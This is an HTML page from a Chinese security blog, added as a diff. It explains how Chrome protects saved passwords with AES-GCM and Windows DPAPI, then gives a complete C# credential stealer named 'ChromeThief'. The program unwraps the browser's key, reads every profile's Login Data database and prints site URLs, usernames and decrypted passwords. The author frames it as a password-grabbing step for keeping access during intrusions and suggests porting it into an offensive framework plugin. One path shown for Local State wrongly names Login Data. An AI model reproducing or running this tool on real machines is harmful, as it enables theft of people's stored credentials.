@@ -1,0 +1,324 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta content="Hello, P001's blog!" property="og:site_name">
+
+  <meta content="渗透取证技巧--Chrome浏览器密码凭据窃取和C#实现" property="og:title">
+
+
+  <meta content="article" property="og:type">
+
+
+  <meta content=" <h1>P001water@c:\Users\maylas\.ssh</h1> <h3>Do Enjoy youself in hack life</h3> --------CMD /c 这里是朴水... ... Reply from 1988 !-------" property="og:description">
+
+
+  <meta content="http://localhost:4000/%E5%8F%96%E8%AF%81/windows%20dpapi/2023/05/12/Chrome%E6%B5%8F%E8%A7%88%E5%99%A8%E5%87%AD%E6%8D%AE%E7%AA%83%E5%8F%96%E5%92%8CC-%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0.html" property="og:url">
+
+
+  <meta content="2023-05-12T00:00:00+08:00" property="article:published_time">
+  <meta content="http://localhost:4000/about/" property="article:author">
+
+
+  <meta property="og:image" content="">
+
+
+  
+  <meta content="取证" property="article:section">
+  
+
+
+  
+
+  <title>渗透取证技巧--Chrome浏览器密码凭据窃取和C#实现</title>
+  <meta name="description" content="文前漫谈">
+<!-- <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.2/jquery.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" integrity="sha384-0mSbJDEHialfmuBBQP6A4Qrprq5OVfW37PRR3j5ELqxss1yVqOtnepnHVP9aJ7xS" crossorigin="anonymous"></script> -->
+  <link rel="stylesheet" href="/css/main.css">
+  <link rel="stylesheet" href="/css/bootstrap.min.css">
+  
+  <!-- <link href='https://fonts.googleapis.com/css?family=PT+Sans' rel='stylesheet' type='text/css'> -->
+  <!-- <link href='https://fonts.googleapis.com/css?family=Fira+Mono' rel='stylesheet' type='text/css'> -->
+  <!-- <link href='https://fonts.googleapis.com/css?family=Lato:400,700' rel='stylesheet' type='text/css'> -->
+  <!-- <link href='https://fonts.googleapis.com/css?family=Source+Code+Pro:400,200,300,500,600,700,900' rel='stylesheet' type='text/css'>
+  <link href='https://fonts.googleapis.com/css?family=Gentium+Basic:400,700' rel='stylesheet' type='text/css'>
+  <link href='https://fonts.googleapis.com/css?family=Alegreya:400,400italic,700' rel='stylesheet' type='text/css'>
+  <link href='https://fonts.googleapis.com/css?family=Lora:400,400italic,700' rel='stylesheet' type='text/css'>
+  <link href='https://fonts.googleapis.com/css?family=Fira+Sans:400,300,500,700' rel='stylesheet' type='text/css'>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.0/jquery.min.js"></script>
+  <link href='https://fonts.googleapis.com/css?family=Open+Sans:400,700' rel='stylesheet' type='text/css'>
+  <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1q8mTJOASx8j1Au+a5WDVnPi2lkFfwwEAa8hDDdjZlpLegxhjVME1fgjWPGmkzs7" crossorigin="anonymous">
+  <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-hQpvDQiCJaD2H465dQfA717v7lu5qHWtDbWNPvaTJ0ID5xnPUlVXnKzq7b8YUkbN" crossorigin="anonymous"> -->
+  <link rel="canonical" href="http://localhost:4000/%E5%8F%96%E8%AF%81/windows%20dpapi/2023/05/12/Chrome%E6%B5%8F%E8%A7%88%E5%99%A8%E5%87%AD%E6%8D%AE%E7%AA%83%E5%8F%96%E5%92%8CC-%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0.html">
+  <link rel="alternate" type="application/rss+xml" title="Hello, P001's blog!" href="http://localhost:4000/feed.xml">
+</head>
+
+
+  <body>
+<section>
+<nav class="navbar navbar-default navbar-fixed-top">
+  <div class="container">
+    <!-- Brand and toggle get grouped for better mobile display -->
+    <div class="navbar-header">
+      <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1" aria-expanded="false">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+      <a class="navbar-brand" href="/">Hello, P001's blog!</a>
+    </div>
+    
+
+    <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+      <ul class="nav navbar-nav">
+        
+        
+        <li><a href="/Lnk/">Lnk</a></li>
+        
+        
+        
+        <li><a href="/about/">About</a></li>
+        
+        
+        
+        
+        
+        
+        
+        
+
+
+      </ul>
+
+    <!--  <ul class="nav navbar-nav navbar-right">
+        <li><a href="#">Know More!</a></li>
+
+      </ul>-->
+    </div><!-- /.navbar-collapse -->
+  </div><!-- /.container-fluid -->
+</nav>
+</section>
+
+<section>
+<article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <div class="jumbotron">
+    <div class="container">
+      <h1 class="post-title-main" itemprop="name headline">渗透取证技巧--Chrome浏览器密码凭据窃取和C#实现</h1>
+      <p class="post-meta"><time datetime="2023-05-12T00:00:00+08:00" itemprop="datePublished">May 12, 2023</time></p>
+      
+    </div>
+
+</div>
+
+
+  <div class="post-content container" itemprop="articleBody">
+    <h1 id="文前漫谈">文前漫谈</h1>
+
+<p>权限维持的重要步骤，抓密码。本文通过对Windows DPAPI的基本认识和chrome密码加密机制的理解基础上，编写C#代码实现对chrome浏览器密码的解密</p>
+
+<p>实际利用下，最好是通过go，c/c++这种改写或者编到cs的插件中，基于.net平台还是有点麻烦，得准备两三个版本。</p>
+
+<h1 id="chrome的加密过程">Chrome的加密过程</h1>
+
+<ul>
+  <li>将用户保存的账户密码使用AES GCM加密</li>
+  <li>将AES加密密钥通过Windows DPAPI加密保存在名为Local State的文件中，文件以json格式存储。</li>
+  <li>将初始化向量与密文连接起来，并将它们保存在名为Login Data的文件中，文件以sqlite数据库形式存储。</li>
+</ul>
+
+<h2 id="local-state加密密钥存放的位置">Local State——加密密钥存放的位置</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Login Data
+</code></pre></div></div>
+
+<p>文件以json格式储存，encrypted_key 的值就是Windows dpapi加密过后的AES密钥</p>
+
+<p><img src="/img/image-20230628135158057.png" alt="image-20230628135158057" style="zoom:80%;" /></p>
+
+<h2 id="login-data密文存放的位置">Login Data——密文存放的位置</h2>
+
+<p>Sqlite3数据库</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\Login Data
+</code></pre></div></div>
+
+<p>数据库结构，我们需要注意的几个字段的值</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>origin_url: 起始url
+action_url: form表单提交的地址
+username_value  用户名字段
+password_value 密码字段
+</code></pre></div></div>
+
+<p>origin_url和action_url的选择需要注意，有时候用户手动添加的账户密码没有action_url字段的值。</p>
+
+<p><img src="/img/image-20230628140800353.png" alt="image-20230628140800353" style="zoom:80%;" /></p>
+
+<h2 id="aes-解密过程">AES-解密过程</h2>
+
+<p>AES-GCM解密不仅需要密钥，还需要偏移量。我们从Local Data数据库提取我们需要的字段，ciphey的值是密码AES加密后的值</p>
+
+<p><img src="/img/image-20230628143438678.png" alt="image-20230628143438678" /></p>
+
+<p>它包含了两个重要的值：</p>
+
+<ul>
+  <li>Initialization vector （初始化向量）</li>
+  <li>Encrypted passwords （加密后的密码）</li>
+</ul>
+
+<p>用python代码解释这两者的位置，</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">initialisation_vector</span> <span class="o">=</span> <span class="n">ciphertext</span><span class="p">[</span><span class="mi">3</span><span class="p">:</span><span class="mi">15</span><span class="p">]</span>
+<span class="n">encrypted_password</span> <span class="o">=</span> <span class="n">ciphertext</span><span class="p">[</span><span class="mi">15</span><span class="p">:</span><span class="o">-</span><span class="mi">16</span><span class="p">]</span>
+</code></pre></div></div>
+
+<p>按照上面的流程实现代码如下</p>
+
+<h1 id="c-代码实现">C# 代码实现</h1>
+
+<p>为什么用C#？</p>
+
+<p>刚开始想写个powershell的脚本调用的，但是实战装库等情况复杂。可能还是类C的实现实用</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>using System;
+using System.Text;
+using System.IO;
+using System.Data.SQLite;
+using System.Linq;
+using Org.BouncyCastle.Crypto.Engines;
+using Org.BouncyCastle.Crypto.Modes;
+using Org.BouncyCastle.Crypto.Parameters;
+using System.Security.Cryptography;
+
+
+namespace ChromeThief
+{
+    class Program
+    {
+        // GLOBAL CONSTANT
+        private static readonly string CHROME_PATH_LOCAL_STATE = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Google\Chrome\User Data\Local State");
+        private static readonly string CHROME_PATH = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Google\Chrome\User Data");
+
+        private static String DecryptPassword(byte[] encryptedPassword, byte[] iv, byte[] secretKey)
+        {
+            string sR = string.Empty; 
+            try
+            {
+                GcmBlockCipher cipher = new GcmBlockCipher(new AesEngine());
+                AeadParameters parameters = new AeadParameters(new KeyParameter(secretKey), 128, iv, null);
+
+                cipher.Init(false, parameters);
+                byte[] plainBytes = new byte[cipher.GetOutputSize(encryptedPassword.Length)];
+                Int32 retLen = cipher.ProcessBytes(encryptedPassword, 0, encryptedPassword.Length, plainBytes, 0);
+                cipher.DoFinal(plainBytes, retLen);
+
+                sR = Encoding.UTF8.GetString(plainBytes).TrimEnd("\r\n\0".ToCharArray());
+                //Console.WriteLine(sR);
+                return sR;
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine($"{e.Message}");
+                Console.WriteLine("[ERR] Unable to decrypt, Chrome version &lt;80 not supported. Please check.");
+                return null;
+            }
+        }
+
+
+        private static byte[] GetSecretKey()
+        {
+            try
+            {
+                // Get secretkey from chrome local state
+                var localState = File.ReadAllText(CHROME_PATH_LOCAL_STATE);
+                dynamic json = Newtonsoft.Json.JsonConvert.DeserializeObject(localState);
+                String key = json.os_crypt.encrypted_key;
+                byte[] encryptedKeyBytes = Convert.FromBase64String(key);
+                //Console.WriteLine(encryptedKeyBytes);
+                byte[] encryptedKey = new byte[encryptedKeyBytes.Length - 5];
+                Array.Copy(encryptedKeyBytes, 5, encryptedKey, 0, encryptedKey.Length);
+                byte[] secretKey = ProtectedData.Unprotect(encryptedKey, null, DataProtectionScope.LocalMachine);
+                //Console.WriteLine(BitConverter.ToString(secretKey));  
+                return secretKey;
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine($"{e.Message}");
+                Console.WriteLine("[ERR] Chrome secretkey cannot be found");
+                return null;
+            }
+        }
+        
+                static void Main(string[] args)
+        {
+            //Console.WriteLine(CHROME_PATH_LOCAL_STATE);
+            //Console.WriteLine(CHROME_PATH);
+            var folders = Directory.GetDirectories(CHROME_PATH, "Profile*").Union(Directory.GetDirectories(CHROME_PATH, "Default"));
+            var secretKey = GetSecretKey();
+            //C: \Users\86176\AppData\Local\Google\Chrome\User Data\Default
+
+            foreach (var folder in folders)	
+            {
+                //Console.WriteLine(folder);
+                var chromePathLoginDb = Path.Combine(folder, "Login Data");
+                string connectionString = String.Format("Data Source={0};Version=3;", chromePathLoginDb);
+                var conn = new SQLiteConnection(connectionString);
+                conn.Open();
+                SQLiteCommand cmd = new SQLiteCommand("SELECT origin_url, username_value, password_value FROM logins", conn);
+                var reader = cmd.ExecuteReader();
+                while (reader.Read())
+                {
+                    var url = reader.GetString(0);
+                    var username = reader.GetString(1);
+                    var ciphertext = (byte[])reader.GetValue(2);
+                    //Console.WriteLine(ciphertext);
+
+                    if (!string.IsNullOrEmpty(url) &amp;&amp; !string.IsNullOrEmpty(username) &amp;&amp; ciphertext != null)
+                    {
+                        // Filter the initialisation vector &amp; encrypted password from ciphertext
+                        //byte[] iv = new byte[12];
+                        //Array.Copy(ciphertext, 3, iv, 0, 12);
+                        ////System.Array.Copy(encryptedData, 3 + iv.Length, ciphertextTag, 0, ciphertextTag.Length);
+                        //byte[] encryptedPassword = new byte[ciphertext.Length - 15 - 16];
+                        //Array.Copy(ciphertext, 15, encryptedPassword, 0, ciphertext.Length - 15 - 16);
+                        byte[] iv = new byte[12];
+                        byte[] ciphertextTag = new byte[ciphertext.Length - 3 - iv.Length];
+
+                        System.Array.Copy(ciphertext, 3, iv, 0, iv.Length);
+                        System.Array.Copy(ciphertext, 3 + iv.Length, ciphertextTag, 0, ciphertextTag.Length);
+                        // Use AES algorithm to decrypt the password
+                        Console.WriteLine($"URL: {url}\nUser Name: {username}");
+                        var decryptedPassword = DecryptPassword(ciphertextTag, iv, secretKey);
+                        Console.WriteLine($"Password: {decryptedPassword}\n");
+
+                    }
+                }
+            }
+        }
+
+    }
+}
+
+</code></pre></div></div>
+
+
+  </div>
+
+</article>
+
+</section>
+<nav class="navbar navbar-default navbar-fixed-bottom">
+  <div class="container footer-content">
+    Happy with <i class ="fa fa-heart"></i> by P001water<br>
+    Powered By May1as 
+  </div>
+</nav>
+
+  </body>
+
+</html>
